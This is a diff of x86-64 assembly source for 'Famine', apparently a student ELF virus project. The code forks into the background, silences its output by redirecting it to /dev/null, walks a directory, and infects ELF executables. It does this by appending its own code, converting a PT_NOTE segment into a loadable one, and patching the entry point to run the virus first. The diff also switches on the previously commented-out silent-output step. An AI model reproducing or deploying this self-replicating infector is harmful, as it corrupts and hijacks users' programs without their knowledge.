@@ -3,6 +3,15 @@
 %define SYS_CLOSE   3
 %define SYS_CHDIR   80
 %define SYS_EXIT    60
+%define SYS_GETDENTS64 217
+%define SYS_PREAD64 17
+%define SYS_FSTAT   5
+%define SYS_LSEEK   8
+%define SYS_FORK    57
+%define SYS_PWRITE64 18
+%define SYS_SYNC    162
+%define SYS_DUP2    33
+%define FLAG_O_RDONLY 0
 %define NULL        0
 
 %define SUCCESS    0
@@ -14,13 +23,13 @@ section .text
     global _start
 
 _start:
-    mov rax, 57
+    mov rax, SYS_FORK
     syscall
 
-    test rax, rax
+    test rax, rax ;check error or parent
     jnz safe_exit
 
-    ; call redirect_dev_null
+    call redirect_dev_null
 
     mov r12, rsp
     add r12, 8
@@ -42,10 +51,10 @@ _start:
     call restore_stack ; exit
 
 infect_dir:
-    call chdir ; change directory to "/tmp/test2"
+    call chdir
     test rax, rax ; check for error
     js .failed ; if error, exit
-    call open_dir ; change directory to "/tmp/test2"
+    call open_dir
     test rax, rax ; check for error
     js .failed ; if error, exit
     call getdents
@@ -58,7 +67,7 @@ infect_dir:
 
 open_dir:
     mov rax, SYS_OPEN ; syscall number for sys_open
-    mov rsi, 0 ; O_RDONLY
+    mov rsi, FLAG_O_RDONLY ; O_RDONLY
     syscall ; invoke operating system to open directory
     test rax, rax ; check for error
     js safe_exit ; if error, exit
@@ -71,7 +80,7 @@ chdir:
 
 getdents:
     mov rdi, rax ; save file descriptor
-    mov rax, 217 ; syscall number for sys_getdents64
+    mov rax, SYS_GETDENTS64
     lea rsi, [r15 + 400] ; buffer to store directory entries
     mov rdx, 8192 ; size of buffer
     syscall ; invoke operating system to read directory entries
@@ -126,7 +135,7 @@ iterate_loop:
     mov rdi, r9
     mov rsi, 0
     mov rdx, 2
-    mov rax, 8
+    mov rax, SYS_LSEEK
     syscall
     push rax
 
@@ -139,7 +148,7 @@ iterate_loop:
     lea rsi, [r11 + _start]
     mov rdx, safe_exit - _start
     mov r10, rax
-    mov rax, 18
+    mov rax, SYS_PWRITE64
     syscall
 
     cmp rax, 0
@@ -185,7 +194,7 @@ pread:
     lea rsi, [r15 + 144] ; buffer to store ELF header
     mov rdx, 64 ; size of ELF header
     mov r10, 0 ; offset (start of the file)
-    mov rax, 17 ; syscall number for sys_pread64
+    mov rax, SYS_PREAD64 ; syscall number for sys_pread64
     syscall ; invoke operating system to read ELF header
     ret
 
@@ -194,7 +203,7 @@ find_phdr:
     lea rsi, [r15 + 208] ; buffer to store program header
     mov dx, word [r15 + 198] ; size of program header
     mov r10, r8 ; offset (start of program header)
-    mov rax, 17 ; syscall number for sys_pread64
+    mov rax, SYS_PREAD64 ; syscall number for sys_pread64
     syscall ; invoke operating system to read program header
 
     cmp byte [r15 + 208], 4 ; check if it's a PT_NOTE segment
@@ -226,7 +235,7 @@ get_target_phdr_file_offset:
 file_info:
     mov rdi, r9
     mov rsi, r15
-    mov rax, 5
+    mov rax, SYS_FSTAT
     syscall
     test rax, rax
     js .error
@@ -252,7 +261,7 @@ patch_phdr:
     lea rsi, [r15 + 208]
     mov dx, word [r15 + 198]
     mov r10, r14
-    mov rax, 18
+    mov rax, SYS_PWRITE64
     syscall
     cmp rax, 0
     jbe .error
@@ -271,7 +280,7 @@ patch_ehdr:
     lea rsi, [r15 + 144]
     mov rdx, 64
     mov r10, 0
-    mov rax, 18
+    mov rax, SYS_PWRITE64
     syscall
     cmp rax, 0
     jbe .error
@@ -285,7 +294,7 @@ write_patched_jmp:
     mov rdi, r9
     mov rsi, 0
     mov rdx, 2
-    mov rax, 8
+    mov rax, SYS_LSEEK
     syscall
 
     mov rdx, [r15 + 224]
@@ -299,12 +308,12 @@ write_patched_jmp:
     lea rsi, [r15 + 300]
     mov rdx, 5
     mov r10, rax
-    mov rax, 18
+    mov rax, SYS_PWRITE64
     syscall
     cmp rax, 0
     jbe .error
 
-    mov rax, 162
+    mov rax, SYS_SYNC
     syscall
     mov rax, SUCCESS
     ret
@@ -383,28 +392,28 @@ famine_str db 'famine=', 0
 
 dev_null db "/dev/null", NULL
 
-signature db "Famine project coded by gemartin", NULL
+signature db "Famine version 1.0 (c)oded dec-2024 by gemartin", NULL
 
 redirect_dev_null:
     lea rdi, [rel dev_null]
     mov rsi, 0
-    mov rax, 2
+    mov rax, SYS_OPEN
     syscall
     mov rdi, rax
 
     mov rsi, 0
-    mov rax, 33
+    mov rax, SYS_DUP2
     syscall
 
     mov rsi, 1
-    mov rax, 33
+    mov rax, SYS_DUP2
     syscall
 
     mov rsi, 2
-    mov rax, 33
+    mov rax, SYS_DUP2
     syscall
 
-    mov rax, 3
+    mov rax, SYS_CLOSE
     syscall
     ret
 
